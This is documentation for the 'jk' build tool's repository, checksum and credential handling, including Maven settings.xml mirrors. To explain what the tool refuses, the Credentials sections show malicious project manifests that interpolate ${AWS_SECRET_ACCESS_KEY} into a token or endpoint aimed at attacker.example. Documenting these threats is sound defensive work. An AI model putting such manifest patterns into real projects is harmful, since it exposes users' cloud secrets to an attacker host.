# Repositories and auth

```bash
jk auth login                  # GitHub / GitLab / Gitea / Bitbucket
jk repo login | logout | search | refresh
```

Credentials: env, `jk repo login`, or Maven `settings.xml` — see [Credentials](#credentials) for
the order and for why a credential only travels to the origin its name is bound to. Prefer
`${VAR}` references in your own `~/.jk/config.toml` over secrets in TOML. Corporate mirrors, forge
package registries, S3/MinIO, and GCS are supported. After lock, a build reads the repository's store under `JK_STORE_DIR/repos/` (see below); a
digest-matching file in the Maven local repository is copied into it rather than downloaded. Set
`[m2] integration = false` to leave the Maven local repository alone. `jk install` writes the Maven local repo
when `[m2] install` is on (default); `[m2] install = false` or `JK_M2_INSTALL=false`
keeps those artifacts in `repos/jk-local`. First-party workers always live in `repos/jk-local`
(`jk-local` is reserved; `[repositories.local]` is a normal user remote name).

## Store layout: one tree per origin

The name you give a repository is yours alone — a label. The store keys each repository's tree
by **where its bytes come from**: `repos/<origin-id>/`, where the id is the origin's host followed
by a digest of its canonical URL (`repos/nexus.acme.com-3f9a1c2b4d5e/`), and the three public
origins jk ships with keep their reserved words (`repos/central`, `repos/google`,
`repos/jumpkick`). So two projects that both call a repository `private` but point it at
different servers never share a cache — a POM or jar fetched for one origin is never served as
the other's, and a poisoned mirror reaches only the projects that actually resolve from it —
while one origin declared under two names is cached once. Each tree records the origin and the
first name it was filled under in `.origin`; `jk storage usage` and `jk doctor` print
`repo: <name> → <origin>` for every tree.

A `repos/<name>` tree from before this rule carries no origin anyone can vouch for, so nothing
reads it; `jk storage usage` flags it and `jk storage clean` removes it. The next resolve
re-fetches into the identity-keyed tree. The cost of that upgrade is bounded: the reserved trees
(`central`, `google`, `jumpkick`) and the `jk-local` shelf are kept as they are, and with
`[m2] integration` on (the default) third-party jars already in `~/.m2/repository` are copied
in rather than downloaded, so what is fetched again is the POMs and jars of the repositories you
named yourself. Lockfile `source`
fields are unchanged (`"<name>+<url>"`): the URL in the row is what the lookup keys on.

## Built-in remotes

When you declare none: **JumpKick official repo → Maven Central → Google Maven**.
Routing is by group:

| Coordinates | Where they resolve |
|-------------|--------------------|
| `cc.jumpkick`, `cc.jumpkick.*`, `build.jumpkick`, `build.jumpkick.*` | **JumpKick only** (never Central) — dependency-confusion safe |
| `androidx.*`, `com.android.*`, `com.google.android.*`, Firebase/ML Kit/Play-related Google Android groups | **Google Maven first**; Central when Google does not serve the coordinate (`com.google.firebase:firebase-admin` lives on Central, the Firebase Android SDK on Google) |
| Everything else | **Central** (JumpKick/Google specialists are not probed for unbound third-party GAs) |

Official product URL: `https://jumpkick.build/repo/` (override `JK_OFFICIAL_REPO_URL`).
Publishing that repo: [contributor maven-repo](../contributors/maven-repo.md).

Google’s routed set applies whenever the Google Android Maven remote is present
(built-in or declared as `google` / `dl.google.com`). A routed group is a precedence rule
between public repositories, not a confinement: Google answers alone when it has the
coordinate, and a miss there is asked of the other remotes. Declared `groups` on Google are
**exclusive** bindings on top of the routed defaults.

### When Central refuses this host

Maven Central refuses a host two ways, and both are sticky for hours: Sonatype's per-IP quota
answers HTTP 429, and Cloudflare, which fronts Central's edge, blocks a host it judges abusive
with HTTP 403 carrying `Server: cloudflare` (curl from the next machine still gets 200). Either
answer on a Central request opens a four-hour **mirror window**: the refused request is reissued
against Google's Central mirror (`maven-central.storage-download.googleapis.com/maven2`) in the
same call, and every Central-bound request for the rest of the window — POMs, `maven-metadata.xml`,
plugin workers' closures — goes there without asking Central first. Artifact bytes prefer the
mirror at all times, refused or not: a locked artifact is pinned by its sha256, so where the
bytes came from does not matter, and the mirror tolerates far more concurrency than Sonatype.

The window is a transport fact, not a repository: the lock records `central` at Central's own URL
and is byte-identical to one written directly. The results say what happened, once per lock,
under **Lock notes**:

```
Maven Central is blocking this host (Cloudflare); using the mirror for 4 h
Maven Central is rate-limiting this host (HTTP 429); using the mirror for 4 h
```

The window lives in `~/.jk/cache/central-rate-limited.stamp`, whose age is the clock, so it
survives `jk engine stop`. Delete the file to ask Central again now; `touch` it to open the
window by hand. `JK_CENTRAL_MIRROR=off` keeps asking Central whatever it answers: a Cloudflare
block then fails the request as `Maven Central is blocking this host (Cloudflare): HTTP 403
fetching …`, naming the switch that keeps the mirror off, and is not retried. A 403 without
Cloudflare's headers is a permission answer and is reported as one.

## Exclusive groups (your internals)

When you declare an **internal** repository next to a public one, bind *your* Maven
namespaces so those coordinates are **never** fetched from other remotes:

```toml
[repositories.central]
url = "https://repo.maven.apache.org/maven2/"

[repositories.internal]
url = "https://repo.acme.com/maven"
groups = ["com.acme", "com.acme.*"]
```

- **Bound group** → solver only sees versions from claiming repos (a higher version
  planted on Central cannot win).
- **Unbound group** → general remotes in declared order; first repo advertising any
  version answers. Only when every general remote misses does jk fall back to
  non-claiming specialists.
- **Already locked** artifacts keep their lockfile source pin until you re-resolve that
  line (`jk update`).
- Multiple repositories **without** any `groups` → jk **warns once** per lock (still
  resolves). Add exclusive bindings for internal namespaces.

`jk repo refresh <coord>` re-fetches a coordinate (lock-time checksum mismatch is
fail-closed; this is the intentional redo).

## Transport and checksum trust

`jk lock` is where a checksum becomes law, so the bytes it pins must arrive over a channel
nobody can rewrite and match a checksum the repository itself publishes. A repository that
cannot offer one of those is refused until its table says so:

```toml
[repositories.mirror]
url = "http://nexus.corp.example/maven"   # refused without the next line
allow-insecure = true

[repositories.legacy]
url = "https://old.example/maven"          # publishes no .sha256 / .sha1 / .md5 sidecars
allow-unverified = true
```

| Key | Default | What it accepts | The threat it accepts |
|-----|---------|-----------------|-----------------------|
| `allow-insecure` | `false` | A plaintext `http://` URL. Without it the manifest fails to load, naming the repository and URL. Loopback hosts (`localhost`, `127.*`, `::1`) need no opt-in: there is no network path to sit on. A loopback repository is also asked afresh on every lock — the engine keeps no "not found" or version-list memo for a port that may belong to another process next time. | Anyone on the network path can replace the bytes jk pins, and the lockfile then faithfully protects the tampered jar. |
| `allow-unverified` | `false` | Pinning an artifact the repository publishes no `.sha256`, `.sha1` or `.md5` for. Without it `jk lock` / `jk update` fail, naming the artifact and repository. An `.md5` alone is accepted without the key, with a note in the lock output naming the artifact and the weaker digest. | The pin is taken from whatever the wire delivered, with nothing from the publisher vouching for it. |

Both are refused on `central`: Maven Central serves https and publishes a checksum for every
artifact, so the opt-in would only ever hide an attack. `file://` repositories are local disk
with no network path, so neither key applies to them.

## Release and snapshot policy

A repository is asked only for the kind of version its policy covers, as a Maven `<repository>`
is:

```toml
[repositories]
nightly = { url = "https://central.sonatype.com/repository/maven-snapshots/", releases = false }
stable  = { url = "https://repo.example/releases", snapshots = false }
```

| Key | Default | Effect |
|-----|---------|--------|
| `releases` | `true` | Release versions are asked of the repository. `false` makes it snapshot-only: it is never read for a release catalog, so it can neither slow a lock nor supply a floating selector. |
| `snapshots` | `true` | `-SNAPSHOT` versions are asked of the repository. `false` makes it releases-only. |

A repository with both off is refused. The built-in remotes — `central`, `google`, `jumpkick` —
serve releases only. A snapshot is a candidate only when a pin or a dependency's POM names one, or
the `snapshot` selector asks for the newest published version: see
[Dependencies](dependencies.md#snapshots).

When a repository has opted out, the lock summary says so — `Resolved 42 dependencies ·
2 unverified (allowed) · insecure (allowed): mirror` — so the count is visible on every lock
instead of scrolling past as a warning. After the lock, builds enforce the pinned sha256 as
usual.

## Credentials

Sources, in order — the first that yields a credential wins:

1. inline in the `[repositories.<id>]` table: `token`, or `username` + `password`, normally as
   `${VAR}` references expanded when the repository is used — see [Who may write a
   `${VAR}` reference](#who-may-write-a-var-reference)
2. `JK_REPO_<ID>_TOKEN`, or `JK_REPO_<ID>_USERNAME` + `JK_REPO_<ID>_PASSWORD` — `<ID>` is the id
   upper-cased with every non-alphanumeric as `_` (`corp-nexus` → `CORP_NEXUS`)
3. `jk repo login <id>` (stored under `~/.jk/creds/repo/`, owner-only)
4. the `<server>` with that `<id>` in `~/.m2/settings.xml` (a `<mirror>` or active-profile
   `<repository>` with that id in the same file binds the name to its URL — see
   [Maven `settings.xml`](#maven-settingsxml-mirrors-proxies-profiles))
5. a `jk auth login` forge token, for forge package registries (matched by host)

`jk publish --central` reads the id `central`, bound to `https://central.sonatype.com` — see
[Publish: Maven Central](publish.md#maven-central).

### A name is not a destination

Sources 2–4 are keyed by the repository *id*, and the project's `jk.toml` chooses which URL that
id points at. Left alone, a cloned project declaring `[repositories.ossrh] url =
"https://attacker.example/m2/"` would receive whatever your machine holds under `ossrh` on its
first resolve. So a name-keyed credential is sent only to an origin (scheme, host, port) that
something the project cannot edit binds the name to:

| Binding | Where it comes from |
|---------|---------------------|
| the URL `jk repo login <id>` recorded | the login itself. Run inside a project it binds to the URL `~/.jk/config.toml` or that project's `jk.toml` declares for the id (printed on login); `--url <url>` binds explicitly; a host-shaped id (`ghcr.io`, `127.0.0.1:5000`) binds to `https://<id>` |
| `[repositories.<id>]` in `~/.jk/config.toml` | your own config; its origin must match the project's |
| `JK_REPO_<ID>_HOST=<host[:port]>` (or a full URL) | your shell or CI variables. A project's `.env` cannot supply it |
| the id *is* the host | container registries and other repositories addressed by host |

A user-config declaration outranks the rest: if it names another origin than the project does, the
credential stays home even when a `JK_REPO_<ID>_HOST` agrees with the project.

When a credential exists but nothing binds it — or something binds it elsewhere — the repository
is accessed anonymously and jk warns once per run, naming the repository, the origin it declares,
the source that was held back and what would send it:

```
jk: warning: repository `ossrh` at https://attacker.example is accessed anonymously: a credential
for that name exists in the `jk repo login ossrh` store, but `jk repo login ossrh` stored it for
https://s01.oss.sonatype.org, not https://attacker.example; …
```

CI that exports `JK_REPO_INTERNAL_TOKEN` for a repository the project declares exports
`JK_REPO_INTERNAL_HOST=repo.acme.com` beside it.

### Who may write a `${VAR}` reference

An inline `${VAR}` reads your shell too, and which file wrote it decides whether it may:

| Declared in | `${VAR}` may name |
|-------------|-------------------|
| `~/.jk/config.toml` | any variable — the file is yours, and its declaration supplies the credential even when the project declares the same id at the same origin |
| a project `jk.toml` | only the repository's own `JK_REPO_<ID>_*` variables, sent under the same binding rule as the environment source above |

A project manifest is anyone's: a cloned one declaring `[repositories.internal] url =
"https://attacker.example/" token = "${AWS_SECRET_ACCESS_KEY}"` would otherwise receive that value in
the `Authorization` header of its first resolve. So a project's reference to any other variable is
refused, the repository is accessed anonymously, and jk warns once per run:

```
jk: warning: repository `internal` at https://attacker.example is accessed anonymously: its
[repositories.internal] table interpolates ${AWS_SECRET_ACCESS_KEY}, and a project manifest may not
read a variable of your shell into a repository's credential or object-store keys — a cloned project
could name any of them. To send one, declare [repositories.internal] with this URL and the ${VAR}
reference in ~/.jk/config.toml,
export JK_REPO_INTERNAL_TOKEN (or JK_REPO_INTERNAL_USERNAME + JK_REPO_INTERNAL_PASSWORD) with
JK_REPO_INTERNAL_HOST=attacker.example, or run `jk repo login internal --url https://attacker.example/`.
```

The rule covers every `${VAR}` a `[repositories.<id>]` table writes, not only `token` /
`username` / `password`: an object-store repository's `access-key`, `secret-key` and
`session-token`, and its `region` and `endpoint` too — a region rides the request signature in
clear and an endpoint becomes a host name to resolve, so `endpoint =
"https://${AWS_SECRET_ACCESS_KEY}.attacker.example"` would leak the value exactly as `secret-key`
would. A refused object-store key is left unset (the transport falls back to the ambient AWS chain,
or goes unsigned); the literal keys beside it stay. A `[repositories.<id>]` table in
`~/.jk/config.toml` at the same origin supplies its own object-store keys instead, whatever the
project wrote.

A literal credential written into either file is that file's own secret and is used as written;
committing one to a project is a leak of the project's secret, not of yours.

Every `JK_REPO_*` variable is read from the shell that runs `jk` and sent with the request, so it
reaches a resident engine that another terminal started, for that request only. Exporting a token
in a new terminal is enough; no `jk engine stop` is needed.

## Maven `settings.xml`: mirrors, proxies, profiles

A team already on Maven usually reaches the outside world through `~/.m2/settings.xml`: a
`<mirror>` that sends `central` (or `*`) to Nexus or Artifactory, a `<proxy>` in front of it, and
the internal repositories listed in a profile that `<activeProfiles>` turns on. jk reads the same
file, so `jk build` on an unmodified `pom.xml` and `jk import pom.xml` work on the machine `mvn`
works on, with nothing added to the project:

```xml
<settings>
  <mirrors>
    <mirror>
      <id>nexus</id>
      <mirrorOf>*</mirrorOf>
      <url>https://nexus.acme.com/repository/maven-public/</url>
    </mirror>
  </mirrors>
  <servers>
    <server><id>nexus</id><username>me</username><password>…</password></server>
  </servers>
  <proxies>
    <proxy><id>corp</id><protocol>https</protocol><host>proxy.acme.com</host><port>3128</port>
      <nonProxyHosts>*.acme.com|localhost</nonProxyHosts></proxy>
  </proxies>
  <profiles>
    <profile><id>acme</id><repositories>
      <repository><id>acme-releases</id><url>https://nexus.acme.com/repository/releases/</url></repository>
    </repositories></profile>
  </profiles>
  <activeProfiles><activeProfile>acme</activeProfile></activeProfiles>
</settings>
```

**A mirror is a transport rewrite, not a repository.** The resolver keeps asking `central`, the
lock keeps recording `central+https://repo.maven.apache.org/maven2/`, the store keeps its
`repos/central` tree — only the URL every request opens (POMs, jars, `maven-metadata.xml`,
`.module` files, checksum sidecars) changes on this machine. A lock written behind Nexus is
byte-identical to one written on the open internet, which is why a mirror does not go into
`~/.jk/config.toml [repositories]`: a repository declared there is a real source and lands in
every `source` field. `mirrorOf` follows Maven's grammar — `*`, `external:*` (everything not on
this machine), `external:http:*`, `central,google`, `*,!jumpkick` — and the first mirror in file
order that matches wins. The mirror's credential is the `<server>` with the mirror's own `<id>`,
bound to the mirror URL by the file itself. `jk lock` prints one note per mirrored repository:

```
repository `central` is reached through mirror `nexus` (/home/me/.m2/settings.xml) at
https://nexus.acme.com/repository/maven-public/; the lock records `central` at https://repo.maven.apache.org/maven2/
```

A plaintext `http://` mirror on a network path is refused with a warning naming the entry and the
repository is asked at its own URL; a loopback mirror is fine. A `<repository>` a dependency's
POM declares goes through the mirror too. The engine's not-found memo is keyed by the URL a request
opened, so a mirror that appears is asked afresh for a coordinate the repository missed before it
existed, and a mirror removed leaves the repository asked afresh at its own URL. A `file://`
repository and a loopback one are never memoized — not their misses, not their version lists: a
directory on this disk (a workspace path, a git materialization) that gains an artifact is seen on
the next ask, without `--force`.

**A `<proxy>` is jk's proxy** for the protocol it names, between `~/.jk/config.toml [network]` and
the shell's `https_proxy` / `http_proxy` — see [Config § Network](config.md#network). Its
username and password ride as Basic; its `nonProxyHosts` (`|`-separated globs) go direct.

**Active-profile repositories join the project's.** For a coexistence build and for `jk import`,
the `<repositories>` of every profile that `<activeProfiles>` lists (or that is
`activeByDefault` when none is listed) are added to the imported `[repositories]` after the POM's
own, with their `<releases>` / `<snapshots>` policy, and consulted for parents and BOMs during the
import. Their `<server>` credentials are bound to their URLs by the file. These are real
repositories: an artifact resolved from one is recorded under its id in the lock.

Two files are read and merged the way Maven merges them: the user's `~/.m2/settings.xml` over
`$M2_HOME/conf/settings.xml` (or `$MAVEN_HOME`); an id in the user's file hides the same id in the
installation's, and the active-profile ids are the union. `JK_M2_SETTINGS=<file>` names another
user file (Maven's `-s`). Both files are re-read when they change, so editing one needs no
`jk engine stop`. `jk doctor` prints which files the engine read, every mirror with the built-in
remotes it stands in for, the proxies and the profile repositories. Not read:
`<pluginRepositories>`, `<pluginGroups>`, `${...}` expansion and encrypted passwords.

## Related

[Lockfile](lockfile.md) · [Publish](publish.md) · [Dependencies](dependencies.md)
